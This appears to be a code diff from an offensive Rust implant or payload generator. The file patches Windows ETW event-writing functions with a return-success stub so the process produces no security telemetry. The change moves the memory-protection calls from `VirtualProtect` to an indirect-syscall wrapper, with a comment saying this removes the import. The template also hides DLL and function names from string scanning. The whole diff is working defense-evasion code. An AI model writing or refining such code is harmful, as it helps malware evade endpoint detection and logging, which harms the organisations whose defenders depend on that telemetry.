@@ -2,9 +2,8 @@
 
 use windows::core::PCSTR;
 use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
-use windows::Win32::System::Memory::{
-    VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
-};
+use windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
+use windows::Win32::System::Threading::GetCurrentProcess;
 
 /// `xor eax, eax; ret`: returns STATUS_SUCCESS (0) and never writes an event.
 /// Written over the prologue of the event-writing exports.
@@ -35,7 +34,9 @@ pub enum PatchEtwError {
 ///
 /// The DLL and function names are substituted at build time by
 /// `Params::render_fragment` with code that rebuilds them at runtime, so they
-/// do not appear in `strings`.
+/// do not appear in `strings`. The page protection changes go through the
+/// syscall layer's `nt_protect_vm`, so `mode: indirect` removes the
+/// `VirtualProtect` import.
 pub fn patch_etw() -> Result<bool, PatchEtwError> {
     patch_export(&$ETW_DLL_DEF$, &$ETW_FUNC_DEF$)?;
     if PATCH_FULL {
@@ -59,16 +60,17 @@ fn patch_export(dll: &str, func: &str) -> Result<(), PatchEtwError> {
     let target = address as usize as *mut u8;
 
     // Make the first bytes writable.
-    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
-    unsafe {
-        VirtualProtect(
-            target as *const core::ffi::c_void,
-            ETW_PATCH.len(),
-            PAGE_EXECUTE_READWRITE,
-            &mut old_protect,
-        )
+    let mut old_protect = 0u32;
+    let status = crate::nt_protect_vm(
+        unsafe { GetCurrentProcess() },
+        target as *mut core::ffi::c_void,
+        ETW_PATCH.len(),
+        PAGE_EXECUTE_READWRITE.0,
+        &mut old_protect,
+    );
+    if status < 0 {
+        return Err(PatchEtwError::MakeWritableFailed);
     }
-    .map_err(|_| PatchEtwError::MakeWritableFailed)?;
 
     // Write the patch.
     unsafe {
@@ -78,15 +80,16 @@ fn patch_export(dll: &str, func: &str) -> Result<(), PatchEtwError> {
     }
 
     // Restore the original protection.
-    unsafe {
-        VirtualProtect(
-            target as *const core::ffi::c_void,
-            ETW_PATCH.len(),
-            old_protect,
-            &mut old_protect,
-        )
+    let status = crate::nt_protect_vm(
+        unsafe { GetCurrentProcess() },
+        target as *mut core::ffi::c_void,
+        ETW_PATCH.len(),
+        old_protect,
+        &mut old_protect,
+    );
+    if status < 0 {
+        return Err(PatchEtwError::RestoreProtectionFailed);
     }
-    .map_err(|_| PatchEtwError::RestoreProtectionFailed)?;
 
     Ok(())
 }
